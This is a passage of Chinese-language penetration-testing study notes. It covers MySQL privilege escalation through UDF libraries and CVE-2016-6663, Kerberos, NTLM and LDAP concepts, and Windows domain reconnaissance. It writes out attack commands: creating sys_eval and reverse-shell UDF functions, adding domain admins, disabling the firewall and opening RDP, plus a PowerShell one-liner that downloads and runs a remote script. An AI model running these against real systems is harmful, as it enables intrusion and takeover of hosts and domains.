href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><ol><li><p>UDF提权</p><p><strong>原理</strong>：用户通过数据库中的自定义函数功能，添加新的函数。</p><p><strong>攻击过程</strong></p><ol><li><p>选择动态链接库</p><p>如果是 MySQL&gt;=5.1 版本，就必须把UDF的动态链接库文件放置于MySQL安装目录下的lib\plugin文件夹下面才能创建自定义函数，动态链接库文件在常用的sqlmap（/data/udf/mysql）和MSF（/embedded/framework/data/exploits/mysql）中就有</p><blockquote><p>sqlmap中的动态链接库为了防止被误杀都被经过了编码处理，需要使用sqlmap自带的解码工具解码后使用（/extra/cloak/cloak.py）</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure></li><li><p>找到靶机中动态链接库的存放位置</p><p><code>show variables like &#39;%plugin%&#39;;</code></p><blockquote><p>如果不存在，可以依靠自己手工在MySQL的安装目录创建\lib\plugin文件夹</p><p>寻找安装目录：select @@basedir;</p></blockquote></li><li><p>写入动态链接库</p><ul><li><p>有SQL注入并且是最高权限，plugin目录可以写入并且需要<code>secure_file_priv</code>无限制，MySQL插件目录可以被MySQL写入，这个时候就可以使用sqlmap上传动态链接库，GET请求有字节长度限制，所以一般POST请求才可以执行这样的攻击。</p></li><li><p>无SQL注入就直接操作SQL语句，当<code>secure_file_priv</code>无限制的时候，我们也可以直接写入plugin目录下</p><ul><li><p>写入时最好将内容使用十六进制编码再写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">seler 0x………… into dumpfile path;<br>outfile：多行写入<br>dumpfile：单行写入<br>如脱库时，那就用outfile更好使，但是如果用outfife去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏，所以一般导出导出二进制文件(udf提权)时就用dumpfile<br><br>获取十六进制<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>)) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>; 导入文件中方便观察<br></code></pre></td></tr></table></figure></li><li><p>也可以先写入小马，获取shell，再直接上传文件</p></li></ul></li></ul></li><li><p>创建自定义函数，并调用命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span>; 创建函数<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; 查询是否新增了函数<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&quot;whoami&quot;</span>); 执行命令<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval; 删除自定义函数<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>如果数据库在内网，无法直接连接MySQL或者MySQL不允许外连，我们就可以使用网页脚本（类似于大马）PHP大马脚本：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php%EF%BC%9B%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8Navicat%E7%BB%93%E5%90%88%E5%AE%83%E8%87%AA%E5%B8%A6%E7%9A%84tunnel%E9%9A%A7%E9%81%93%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BAHTTP%E9%80%9A%E9%81%93%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php；也可以使用Navicat结合它自带的tunnel隧道脚本搭建HTTP通道连接数据库。</a></p></blockquote><p><strong>反弹shell</strong></p><p>使用被定制好的动态链接库，调用函数来执行命令，反弹shell等</p><p>工具下载：<a href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p><p>同样的导入然后创建函数</p><p><code>CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p><p>反弹shell</p><p><code>select backshell(&quot;IP&quot;, port);</code></p></li><li><p>MOF提权</p><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。总结Windows的时候再仔细补充。</p></li><li><p>启动项提权</p><p>常见于Windows，后面Windows提权的时候在补充</p></li><li><p>CVE-2016-6663</p><p><strong>漏洞详情</strong>：竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限，要获取root用户权限，需要结合之前的提权方法进一步操作。</p><p><strong>漏洞条件：</strong></p><ol><li>Getshell 拿到 www-data 权限</li><li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li><li>关键提取步骤需要在交互环境下，所以需要反弹shell</li><li>MySQL版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li><li>MariaDB版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li></ol><p><strong>漏洞复现</strong></p><p>环境搭建：使用国光师傅的docker环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 拉取镜像</span><br>docker pull sqlsec/cve-2016-6663<br><span class="hljs-comment"># 部署镜像</span><br>docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663<br></code></pre></td></tr></table></figure><p>连接上shell，获得一个低权限用户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721164602551.png" alt="image-20210721164602551"></p><p>上传EXP，并且编译执行</p><p>​    EXP：<a href="https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c">https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>​    编译EXP：<code>gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</code></p><p>​    执行EXP进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库<br><br>./mysql-privesc-race <span class="hljs-built_in">test</span> 123456 localhost <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>使用蚁剑，冰蝎直接执行有提权问题，所以还是需要反弹shell执行</p><p>提权成功，进一步提权上面指出需要<code>CVE-2016-6662 or CVE-2016-6664</code>，也可以看看有没有其他的提权漏洞</p></li></ol><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p><blockquote><p>感觉对于Windows用的比较多的还是图形化界面，命令的使用不是特别多</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig /all 查看IP<br>whoami 查看当前用户<br>systmeinfo 查看详细信息<br>netstat -ano 查看端口开放情况<br>tracert ip/域名  路由追踪<br>ping 检测主机之间的连通性<br>ipconfig /fulshdns 刷新本地DNS缓存<br><br>tasklist 显示当前运行的进程<br>taskkill /pid pidnum 结束进程<br>net start 显示当前运行的服务<br>net start 服务名  启动服务<br>net stop 服务名  停止指定服务<br>net statistics workstation 查看系统开机时间<br><br>dir 列出当前目录文件<br>d:   e:  切换到对应磁盘<br>tree 显示目录结构<br><br>添加用户  net<span class="hljs-built_in"> user </span>username password  /add<br>添加域用户 net<span class="hljs-built_in"> user </span>username password /<span class="hljs-builtin-name">add</span> /domain<br>添加用户到域管 net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Admins&quot;</span> username /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><h4 id="Windows协议"><a href="#Windows协议" class="headerlink" title="Windows协议"></a>Windows协议</h4><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>Kerberos协议是一种计算机网络认证协议，它可以为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。主要用于域环境</p><p>协议的组成：</p><ul><li><p>客户端（client）</p></li><li><p>服务端（Server）</p></li><li><p>密钥分发中心（KDC）：密钥分发中心又分为两部分</p><ul><li>AS：认证服务器，专门用来认证客户端身份并发放客户用户访问TGS的TGT（票据授予票据）</li><li>TGS：票据授予服务器</li></ul><blockquote><p>KDC与在域控运行的其他安全服务集成，KDC使用域的AD域服务器数据库作为其安全数据库，AD域服务是域或林中默认的Kerberos实现必须的。一般情况下KDC安装在域控中，Client和Server为域内的用户或者服务</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722100209527.png" alt="image-20210722100209527"></p><p>认证流程（身份认证服务交换，票据授权服务交换，客户端/服务认证交换）</p><ol><li><p>Client先向KDC发起请求，请求的凭据就是Client hash加密的时间戳</p></li><li><p>KDC使用Client hash解密，如果正确就返回解密的TGT，TGT中包含了PAC，PAC中包含了Client的sid，Client所在的组</p><blockquote><p>PAC(Privilege Attribute Certificate)特权属性证书，不同账户有不同的权限，PAC就是用来区分不同权限的</p></blockquote></li><li><p>Client凭借TGT票据向KDC发起针对特定服务的请求</p></li><li><p>KDC解密，如果正确就返回加密的TGS（不管用户有没有访问权限，TGT正确就会返回TGS票据）</p></li><li><p>Client拿着TGS票据去请求服务</p></li><li><p>Server解密TGS，验证身份</p></li></ol></li></ul><p>相关漏洞：MS14-068利用kerberos漏洞获取到域控权限，黄金票据，白银票据</p><h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p>Windows内部只保存了密码的hash，并不保存明文密码，本机用户的hash保存在本地的<strong>SAM文件</strong>中，当我们登录系统时，系统会自动读取SAM文件中的密码与我们输入的密码对比，是否相同；域内用户的hash保存在域控的<strong>NTDS.dit</strong>文件中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722110852458.png" alt="image-20210722110852458"></p><ul><li>NTLM Hash 是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成</li><li><strong>Windows本身不存储用户的明文密码</strong>，它会将用户的明文密码经过加密算法后存储在SAM数据库中</li><li>当用户登录的时候，将用户输入的明文密码也加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较</li></ul><p>LM Hash是windows早期用的加密算法，为了解决LM加密和身份验证中的固有的安全弱点，有了NTLM协议，从Windows7 和 windows server 2008开始，系统默认只会存储NTLM Hash。</p><p>NTLM Hash的产生过程</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804094211071.png" alt="image-20210804094211071"></p><p>本地认证流程</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804095544847.png" alt="image-20210804095544847"></p><p>NTLM协议包括了NTLMv1和NTLMv2两个版本，NTLM验证是一种Challenge/Reaponse 验证机制，由三种消息组成：</p><ol><li>协商：确认双方版本</li><li>质询：是Challenge / Response 认证机制起作用的范畴</li><li>验证：完成质询后，验证结果</li></ol><p>质询流程：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804103007109.png" alt="image-20210804103007109"></p><ol><li>客户端向服务器端发送用户信息（用户名）请求</li><li>服务器接搜到请求，判断本地账户列表中是否有对应的而用户名，如果有就生成一个Challenge，使用登录用户名对应的NTLM Hash加密Challenge，生成一个<strong>Net-NTLM Hash存在于内存</strong>中，生成后将Challenge发送给客户端（NTLMv1的Challenge是8位，NTLMv2的Challenge是16位）</li><li>客户端接搜到Challenge后使用将要扽牢固到账户对应的NTLM Hash加密Challenge生成Reaponse，然后将Response发送到服务端</li></ol><p>验证：服务端收到客户端的Response后对比Net-NTLM Hash 和Response是否相同。</p><p>相关漏洞：Hash传递攻击（PTH）</p><p>参考文章</p><p><a href="https://www.cnblogs.com/-qing-/p/11343859.html">https://www.cnblogs.com/-qing-/p/11343859.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p><h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>Active Directory（活动目录）</p><ol><li><p>概念</p><ul><li><p>Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。它使用了一种结构化的数据存储方法，并且以此为基础对目录信息进行呵护逻辑的分层组织。</p><blockquote><p>网络对象：用户，用户组，计算机，域，组织单位以及安全策略等</p></blockquote></li></ul></li><li><p>活动目录的功能</p><ul><li>服务器以及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略</li><li>用户服务：管理用户域账户，用户信息，企业通讯录，用户组管理，用户身份认证，用户授权管理等</li><li>资源管理：管理打印机，文件共享服务等网络资源</li><li>桌面配置：系统管理员可以集中的配置各种桌面配置策略</li><li>应用系统支撑</li></ul></li></ol><p><a href="https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/">https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/</a></p><p><a href="https://zhuanlan.zhihu.com/p/147768058">https://zhuanlan.zhihu.com/p/147768058</a></p><p>LDAP（轻量目录访问协议）：约定了Client与Server之间的信息交互格式，使用端口号，认证方式等内容。微软的<code>Active Directory</code>就是依靠LDAP实现的，AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。<code>OpenLDAP</code> 是可以运行在 Linux 上的 LDAP 协议的开源实现。平常说的 LDAP Server，一般指的是安装并配置了 <code>Active Directory</code>、<code>OpenLDAP</code> 这些程序的服务器。</p><p>LDAP 的目录树概念:</p><ol><li><p>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是 一个条目。</p></li><li><p>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称(DN)。</p></li><li><p>对象类：objectClass，与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属</p><p>性也会被继承下来。</p></li><li><p>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</p></li></ol><h4 id="工作组-域信息收集"><a href="#工作组-域信息收集" class="headerlink" title="工作组/域信息收集"></a>工作组/域信息收集</h4><h5 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros">whoami <span class="hljs-built_in">/user </span>查看当前用户<br>whoami /priv 查看当前用户权限<br>ipconfig /all 查看网络配置<br>nestat -ano  查看端口列表<br>systeminfo 查看系统信息<br>net share 查看本机共享<br>cmdkey /l 远程桌面连接历史记录<br>net<span class="hljs-built_in"> user </span>查看本机上的用户列表<br>net<span class="hljs-built_in"> user </span>name 查看本机用户具体信息<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br>query<span class="hljs-built_in"> user </span>|| qwinsta 查看当前在线用户<br>route <span class="hljs-builtin-name">print</span> 查看路由表缓存<br>arp -a 路由缓存<br><br>wmic OS <span class="hljs-builtin-name">get</span> Caption,CSDVersion,OSArchitecture,Version 查看操作系统（基本systeminfo里面都有）<br>wmic product <span class="hljs-builtin-name">get</span> name,version 查看当前安装的程序<br>wmic<span class="hljs-built_in"> service </span>list brief 查询本机服务信息<br>wmic process list brief 查询进程列表<br>tasklist /v 查询进程列表<br>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct <span class="hljs-builtin-name">Get</span> displayName /Format:list 查杀软<br><br>防火墙相关：<br>关闭防火墙：<br>windows<span class="hljs-built_in"> server </span>2003及以前：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode disable<br>windows<span class="hljs-built_in"> server </span>2003以后：netsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state off<br>查看防火墙配置：netsh<span class="hljs-built_in"> firewall </span>show config<br>修改防火墙配置：<br>windows<span class="hljs-built_in"> server </span>2003及以前允许指定程序全部连接：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> allowedprogram c:\nc.exe <span class="hljs-string">&quot;allow nc&quot;</span> enable<br>windows<span class="hljs-built_in"> server </span>2003以后版本：<br>允许指定程序接入：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span><br>允许指定程序退出：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br>允许3389端口开放：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br>自定义防火墙日志的存储位置：netsh advfirewall <span class="hljs-builtin-name">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;c:\windows\temp\fw.log&quot;</span><br><br>查看代理：reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><br>查看远程服务连接端口：REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br><br>Windows<span class="hljs-built_in"> Server </span>2003中开启3389：wmic path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) <br>call setallowtsconnections 1<br><br>windows<span class="hljs-built_in"> Server </span>2008和2012中开启3389：<br>1. wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) call setallowtsconnections 1<br>2. wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (<span class="hljs-attribute">TerminialNAme</span>=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired 1<br>3. reg <span class="hljs-builtin-name">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUSer /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><h5 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h5><blockquote><p>工作组的信息收集感觉和上面差不多，平时没怎么遇到过</p></blockquote><h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><p>当内网中存在域，那么<strong>本地的普通用户</strong>只能查询到<strong>本机的相关信息</strong>不能查询到域内信息，本地管理员用户和域内用户可以查询域内信息。原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个<strong>查询需要权限</strong>认证，所以只有域用户才拥有这个权限；域用户执行查询命令时，会自动使用kerberos协议认证，无需输入额外的账户密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或者system权限，在域中除了普通用户以外，所有机器都有一个机器用户（用户名是机器名加上$），本质上<strong>机器的system用户对应的就是域内的机器用户</strong>，所以使用system权限可以运行域内的查询命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断是否有域：<br>systeminfo<br>ipconfig /all 查看网关IP，DNS的IP，域名，本机是否和DNS服务器处于同一网段，然后使用nslookup解析域名的IP，判断域控和DNS是否在同一服务器<br><br>whoami /all  获取域SID<br>net<span class="hljs-built_in"> config </span>workstation 查看当前登录域<br>net time /domain 判断主域（域服务器通常作为时间服务器使用）<br><br>net<span class="hljs-built_in"> user </span>/domain 获得所有域用户列表<br>net<span class="hljs-built_in"> user </span>xxx /domain 查询指定用户详细信息<br>wmic useraccount <span class="hljs-builtin-name">get</span> /all 获取域内用户详细信息<br>dsquery<span class="hljs-built_in"> user </span>查看存在的用户<br><br>net view /domain 查询域<br>net view /domain:domain_name 查询域内所有计算机<br><br>net<span class="hljs-built_in"> group </span>/domain 获得所有域用户组列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain computers&quot;</span> /domain 查询域成员计算机<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组（一个域内一般存在两台或者两台以上的域控制器，防灾）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 获得域管理员列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain 查询管理员用户组<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br><br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br><br>nltest /DCLIST:domain_name 查看域控机器名<br>netdom query pdc 查看域控机器名<br>Nslookup <span class="hljs-attribute">-type</span>=SRV _ldap._tcp 查看域控制器主机名<br><br>tasklist /v 列出本机进程和进程用户（需要注意是否有域管理员的进程）<br></code></pre></td></tr></table></figure><p><strong>探测域内存活主机</strong></p><ol><li><code>nbtscan</code>：下载：<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a> 传入靶机执行<code>nbt.exe ip段</code> 即可</li><li>利用ICMP协议探测：<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></li><li>ARP扫描内网：windows版 <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a> 其他版本<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a> </li><li>Empire中的arpscan模块，输入<code>unamemodule situational_awareness/network/arpscan</code></li><li>使用Nishang中的Invoke-ARPScan.ps1脚本</li><li>使用TCP、UDP端口扫描探测内网，ScanLine工具（使用体验不是很好）</li></ol><p><strong>扫描域内端口</strong></p><p>工具下载：<a href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B</a></p><ol><li><p>利用telnet命令扫描</p></li><li><p>s扫描器</p></li><li><p>MSF端口扫描</p></li><li><p>powershell的Invoke-portscan.ps1脚本，推荐使用无文件形式扫描</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:<span class="hljs-tag">\<span class="hljs-name">windows</span></span><span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">res</span></span>.txt&quot;<br></code></pre></td></tr></table></figure></li><li><p>Nishang的Invoke-PortScan模块</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Invoke-PortScan -StartAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.1</span> -EndAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.255</span> 